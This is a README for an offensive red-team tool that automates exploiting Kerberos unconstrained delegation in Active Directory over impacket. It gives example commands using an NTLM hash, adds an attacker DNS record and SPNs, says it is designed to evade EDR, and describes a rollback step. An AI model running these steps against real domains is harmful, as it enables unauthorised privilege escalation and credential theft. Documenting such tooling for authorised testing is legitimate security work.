# Invoke-Unconstrained  
The Invoke-Unconstrained tool automates the exploitation of a compromised machine with unconstrained delegation.

The idea of this tool is to fully automate the exploitation of unconstrained delegation without relying on domain joined machines in order to avoid EDRs or XDRs.  
Several ways can be used to accomplish this task, but they have many steps and are complicated to understand, so the purpose of that tool is to automate the whole steps to compromise a machine using unconstrained delegation issue.  
Additionally, a snapshot of the old state is created to revert changes after the exploitation process.  
This Invoke-Unconstrained tool is based on the `impacket` library which allows attacker to launch that tool from linux-based OS, and also support the same default authentication methods as configured on the impacket library.

### How to Use  
The tool supports multiple authentication methods, including plain-text passwords, NTLM hashes, and Kerberos tickets.


#### General Arguments:  
`-u` - Specify username (The domain should be provided with a backslash, e.g., `LAB\DEG$`).  
`-t` - Specify Vunlerable target.  
`-ah` - Specify a non-exists DNS record that will be point to the attacker-controlled IP Address.  
`-aip` - Specify the controlled attacker IP address that will be added under the attacker's DNS record. 
`-p` - Specify plaintext/NTLM password matched to the username.  
`-k` - Force Kerberos authentication.

Sucessfull output will look as follows:  

The following proof of concept illustrates performing unconstrained delegation attack using NTLM hash using the DEG machine account on the lab domain:  
During the automation process, the tool creates a new DNS record controlled by the attacker (`ATT28.labs.local` -> `10.0.0.12`) to the domain controller (`10.0.0.5`).  
This automation involves LDAP authentication, afterwards, the tool adds new SPNs according to the newly-created DNS record (the `ATT28` attacker host which was added to the `msds-additionaldnshostname` attribute of the `DEG$` machine account).

  
```
Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -t DEG$ -ah ATT28.labs.local -aip 10.0.0.12  10.0.0.5
```
![image](https://github.com/ScorpionesLabs/Invoke-Unconstrained/assets/50461376/a16d91e3-ac86-483e-a8fc-f94c0bfc84f4)

#### Reverting Changes:
We as red teamers believe the cleanup process is important to restoring the victim network to its original state prior to the attack, therefore, the Invoke-Unconstrained tool will roll back all changes made by the tool after escalating our privileges.  

The following example shows how to rollback changes that performed on the victim user to the original state.
```
Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -r .\DEG-2023-10-17--18-20-42.961041 10.0.0.5
```

As can be seen above, on each exploitation, a state file is created which shows that changes made that needs to reverted, including target, SPNs, and DNS records added.  

#### Full Exploitation: 


### Credits

1. Omri Baso From [Scorpiones Labs](https://www.scorpiones.io/).  
2. Some of the code snippets were taken from the [krbrelayx](https://github.com/dirkjanm/krbrelayx/tree/master) Project.  
